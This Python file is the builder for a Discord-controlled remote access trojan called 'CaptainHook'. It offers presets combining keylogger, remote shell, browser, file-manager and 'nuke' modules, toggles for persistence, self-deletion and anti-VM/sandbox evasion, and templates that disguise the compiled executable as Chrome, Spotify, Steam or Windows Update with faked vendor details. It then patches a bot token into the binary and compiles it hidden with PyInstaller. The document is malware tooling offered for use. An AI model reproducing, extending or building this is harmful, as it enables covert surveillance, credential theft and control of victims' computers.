import os
import sys
import shutil
import subprocess
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.live import Live
from rich.columns import Columns

console = Console()

PRESETS = {
    "🛡️  Full-Throttle": {
        "description": "All features included. Maximum power.",
        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"],
        "stealth": True,
        "anti_vm": True
    },
    "👻 Ghost": {
        "description": "Extreme Stealth. Stripped of loud features.",
        "modules": ["screenshot", "shell", "info", "file_manager", "keylogger"],
        "stealth": True,
        "anti_vm": True
    },
    "🧪 The Tester": {
        "description": "VM Friendly. Anti-VM and Persistence DISABLED.",
        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"],
        "stealth": False,
        "anti_vm": False,
        "developer": False
    },
    "🛠️  Developer": {
        "description": "Full Control. Interactive TUI for live debugging. No Stealth.",
        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"],
        "stealth": False,
        "anti_vm": False,
        "developer": True
    },
    "🤡 Troll-Mode": {
        "description": "High Visibility. Focus on fun and control.",
        "modules": ["media", "control", "fun", "screenshot"],
        "stealth": False,
        "anti_vm": False
    },
    "⚙️  Custom": {
        "description": "Manually select modules and security settings.",
        "modules": [],
        "stealth": True,
        "anti_vm": True
    }
}

AVAILABLE_MODULES = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]

DISGUISES = {
    "Google Chrome": {"icon": "chrome.ico", "company": "Google LLC", "desc": "Google Chrome Installer", "version": "120.0.6099.130"},
    "Spotify": {"icon": "spotify.ico", "company": "Spotify AB", "desc": "Spotify Music Player", "version": "1.2.26.1187"},
    "Steam": {"icon": "steam.ico", "company": "Valve Corporation", "desc": "Steam Client Bootstrapper", "version": "2.10.91.91"},
    "Windows Update": {"icon": "winupdate.ico", "company": "Microsoft Corporation", "desc": "Windows Service Host", "version": "10.0.19041.1"}
}

def display_banner():
    banner = """
[bold cyan]
 ██████╗ █████╗ ██████╗ ████████╗ █████╗ ██╗███╗   ██╗    ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██║████╗  ██║    ██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
██║     ███████║██████╔╝   ██║   ███████║██║██╔██╗ ██║    ███████║██║   ██║██║   ██║█████╔╝ 
██║     ██╔══██║██╔═══╝    ██║   ██╔══██║██║██║╚██╗██║    ██╔══██║██║   ██║██║   ██║██╔═██╗ 
╚██████╗██║  ██║██║        ██║   ██║  ██║██║██║ ╚████║    ██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
 ╚═════╝╚═bottom═╝╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
[/bold cyan]
[bold white]                         - Architect Builder v3.1 - [/bold white]
    """
    console.print(Panel(banner, border_style="cyan", padding=(1, 2)))

def get_config():
    token = Prompt.ask("[bold yellow]Discord Bot Token[/bold yellow]")
    guild_id = Prompt.ask("[bold yellow]Guild ID (Session Category)[/bold yellow]")
    
    # Preset Selection
    table = Table(title="Available Presets", box=None)
    table.add_column("ID", style="cyan")
    table.add_column("Preset", style="bold white")
    table.add_column("Description", style="dim")
    
    preset_list = list(PRESETS.keys())
    for i, name in enumerate(preset_list):
        table.add_row(str(i+1), name, PRESETS[name]["description"])
    
    console.print(table)
    choice = int(Prompt.ask("Select Preset", choices=[str(i+1) for i in range(len(preset_list))], default="1"))
    selected_preset_name = preset_list[choice-1]
    
    # Custom Selection Logic
    if "Custom" in selected_preset_name:
        console.print("\n[bold cyan]--- Manual Module Selection ---[/bold cyan]")
        selected_modules = []
        for module in AVAILABLE_MODULES:
            if Confirm.ask(f"Include module [bold green]{module}[/bold green]?"):
                selected_modules.append(module)
        
        stealth = Confirm.ask("Enable Wraith Stealth (Melt/Persistence)?", default=True)
        anti_vm = Confirm.ask("Enable Anti-Analysis (VM/Sandbox Detection)?", default=True)
        
        # Update custom preset data
        PRESETS[selected_preset_name]["modules"] = selected_modules
        PRESETS[selected_preset_name]["stealth"] = stealth
        PRESETS[selected_preset_name]["anti_vm"] = anti_vm
    
    # Disguise Selection
    table_d = Table(title="Disguise Templates", box=None)
    table_d.add_column("ID", style="cyan")
    table_d.add_column("Template", style="bold white")
    table_d.add_column("Company", style="dim")
    
    disguise_list = list(DISGUISES.keys())
    for i, name in enumerate(disguise_list):
        table_d.add_row(str(i+1), name, DISGUISES[name]["company"])
    
    console.print(table_d)
    d_choice = int(Prompt.ask("Select Disguise", choices=[str(i+1) for i in range(len(disguise_list))], default="1"))
    selected_disguise = disguise_list[d_choice-1]
    
    return token, guild_id, selected_preset_name, selected_disguise

def patch_stub(stub_path, output_path, token, guild_id):
    """Perform binary search-and-replace on a pre-compiled stub."""
    try:
        with open(stub_path, "rb") as f:
            data = f.read()

        # Placeholders as they appear in the binary (UTF-8 encoded)
        token_placeholder = b"TOKEN_PLACEHOLDER_64_BYTES____________________________________"
        guild_placeholder = b"GUILD_ID_PLACEHOLDER_32_BYTES_______"

        if token_placeholder not in data:
            return False, "Discord Token placeholder not found in stub binary."
        
        # Prepare replacement data (must be padded with null bytes to same length)
        new_token = token.encode('utf-8')
        if len(new_token) > len(token_placeholder):
             return False, "Token is too long for the placeholder."
        new_token = new_token.ljust(len(token_placeholder), b'\x00')

        new_guild = guild_id.encode('utf-8')
        if len(new_guild) > len(guild_placeholder):
             return False, "Guild ID is too long for the placeholder."
        new_guild = new_guild.ljust(len(guild_placeholder), b'\x00')

        # Replace in binary
        patched_data = data.replace(token_placeholder, new_token)
        patched_data = patched_data.replace(guild_placeholder, new_guild)

        with open(output_path, "wb") as f:
            f.write(patched_data)
        
        return True, None
    except Exception as e:
        return False, str(e)

def build(token, guild_id, preset_name, disguise_name):
    preset = PRESETS[preset_name]
    disguise = DISGUISES[disguise_name]
    
    # 1. Check for Stub Mode
    # Stubs should be placed in a 'stubs' directory relative to the builder
    ext = ".exe" if os.name == 'nt' else ""
    stub_filename = f"stub_{preset_name.lower().replace(' ', '_')}{ext}"
    stub_path = os.path.join("stubs", stub_filename)
    
    if os.path.exists(stub_path):
        console.print(f"\n[bold cyan]⚡ STUB MODE DETECTED![/bold cyan]")
        console.print(f"Using pre-compiled stub: [yellow]{stub_path}[/yellow]")
        
        output_name = f"CaptainHook{ext}"
        os.makedirs("dist", exist_ok=True)
        output_path = os.path.join("dist", output_name)
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
            progress.add_task(description="Patching binary stub...", total=None)
            success, error = patch_stub(stub_path, output_path, token, guild_id)
        
        if success:
            console.print(f"\n[bold green]✅ INSTANT BUILD SUCCESSFUL![/bold green]")
            console.print(f"Bot saved to: [bold yellow]{output_path}[/bold yellow]")
            return
        else:
            console.print(f"\n[bold red]❌ Stub Patching Failed:[/bold red] {error}")
            console.print("Falling back to full compilation...")

    # 2. Regular Compilation Mode (Fallback)
    console.print(f"\n[bold green]🏗️  Building {preset_name} disguised as {disguise_name}...[/bold green]\n")
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        transient=True,
    ) as progress:
        # Step 1: Source Preparation
        progress.add_task(description="Preparing source files...", total=None)
        if os.path.exists("build_staging"):
            shutil.rmtree("build_staging")
        
        # Robust project root detection
        # 1. Try current working directory
        project_root = os.getcwd()
        src_path = os.path.join(project_root, "src")
        
        # 2. Try parent directory (if running from builder/)
        if not os.path.exists(src_path):
            project_root = os.path.dirname(os.getcwd())
            src_path = os.path.join(project_root, "src")
            
        # 3. Try grandparent directory (if running from builder/compiler or similar)
        if not os.path.exists(src_path):
            project_root = os.path.dirname(os.path.dirname(os.getcwd()))
            src_path = os.path.join(project_root, "src")

        # 4. Fallback to package resources
        if not os.path.exists(src_path):
             import pkg_resources
             try:
                 src_path = pkg_resources.resource_filename('captainhook', 'src')
             except:
                 pass

        if os.path.exists(src_path):
            shutil.copytree(src_path, "build_staging/src")
        else:
            console.print(f"[bold red]Error:[/bold red] Could not find 'src' directory in {project_root} or parent dirs.")
            return
        
        # Step 2: Injection
        progress.add_task(description="Injecting credentials & configuration...", total=None)
        config_path = "build_staging/src/client/core/config.py"
        with open(config_path, "r") as f:
            content = f.read()
        
        # Use the exact placeholders from config.py
        token_placeholder = "TOKEN_PLACEHOLDER_64_BYTES____________________________________"
        guild_placeholder = "GUILD_ID_PLACEHOLDER_32_BYTES_______"
        
        content = content.replace(token_placeholder, token)
        content = content.replace(guild_placeholder, guild_id)
        
        # Inject Developer Mode
        if preset.get("developer", False):
            content = content.replace("DEVELOPER_MODE = False", "DEVELOPER_MODE = True")
            
        with open(config_path, "w") as f:
            f.write(content)
            
        # Step 3: Module Filtering (Presets)
        progress.add_task(description="Filtering modules for preset...", total=None)
        main_path = "build_staging/src/client/main.py"
        with open(main_path, "r") as f:
            main_content = f.read()
            
        modules_str = str(preset["modules"])
        main_content = main_content.replace('modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]', f'modules = {modules_str}')
        
        if not preset["anti_vm"]:
            main_content = main_content.replace('if AntiAnalysis.check_all():', 'if False:')
        if not preset["stealth"]:
            main_content = main_content.replace('self.wraith.melt()', 'pass # Wraith Disabled')
            main_content = main_content.replace('Persistence.install()', 'pass # Persistence Disabled')

        with open(main_path, "w") as f:
            f.write(main_content)

        # Step 4: Final Compilation Setup
        progress.add_task(description="Setting up distribution folder...", total=None)
        os.makedirs("dist", exist_ok=True)
        
        # Standard hidden imports that often cause issues
        hidden_imports = [
            "--hidden-import=pynput.keyboard._xorg", 
            "--hidden-import=pynput.mouse._xorg",
            "--hidden-import=audioop",
            "--hidden-import=cv2",
            "--hidden-import=numpy"
        ]
        
        for module in preset["modules"]:
            hidden_imports.append(f"--hidden-import=src.client.modules.{module}")
        
        hidden_imports_str = " ".join(hidden_imports)
        
        noconsole = "--noconsole" if not preset.get("developer", False) else ""
        
        # Build command with optimized options (Use relative path for --paths for Docker compatibility)
        cmd = f"pyinstaller --onefile {noconsole} --name CaptainHook --paths=build_staging {hidden_imports_str} --collect-all discord --collect-all mss build_staging/src/client/main.py"
        
        if os.name == 'nt':
            cmd = cmd.replace("--name CaptainHook", f"--name CaptainHook --icon={disguise['icon']}")
            ext = ".exe"
            script_name = "dist/build.bat"
            with open(script_name, "w") as f:
                f.write(f"@echo off\n{cmd}\n")
        else:
            ext = ""
            script_name = "dist/build.sh"
            with open(script_name, "w") as f:
                f.write(f"#!/bin/bash\n{cmd}\n")
            os.chmod(script_name, 0o755)
        
    # Clear the progress and show success
    console.print("\n[bold green]✅ STAGING SUCCESSFUL![/bold green]")
    
    # Summary Table
    table = Table(box=None, padding=(0, 2))
    table.add_column("Property", style="cyan")
    table.add_column("Value", style="white")
    table.add_row("Source", "build_staging/src/client/main.py")
    table.add_row("Preset", preset_name)
    table.add_row("Modules", ", ".join(preset['modules']))
    table.add_row("Stealth", "[green]ENABLED[/green]" if preset['stealth'] else "[red]DISABLED[/red]")
    table.add_row("Output", f"dist/CaptainHook{ext}")
    table.add_row("Script", f"[bold yellow]{script_name}[/bold yellow]")
    console.print(table)

    console.print("\n[bold yellow]🚀 Final Step: Run the command below to compile:[/bold yellow]")
    console.print("-" * 80)
    if os.name == 'nt':
        console.print(f"[white].\\{script_name}[/white]")
    else:
        console.print(f"[white]./{script_name}[/white]")
    console.print("-" * 80)
    console.print(f"[dim]Alternative: {cmd}[/dim]")
    console.print("-" * 80)

    console.print("\n[bold cyan]💡 Cross-Platform Tip:[/bold cyan]")
    console.print("To build for Windows while on Linux, ensure Docker is installed and run:")
    console.print("[dim]docker-compose up windows-builder[/dim]\n")

def main():
    display_banner()
    try:
        config = get_config()
        if Confirm.ask("\n[bold cyan]Confirm Build Settings?[/bold cyan]"):
            build(*config)
    except KeyboardInterrupt:
        console.print("\n[bold red]Build Cancelled.[/bold red]")

if __name__ == "__main__":
    main()
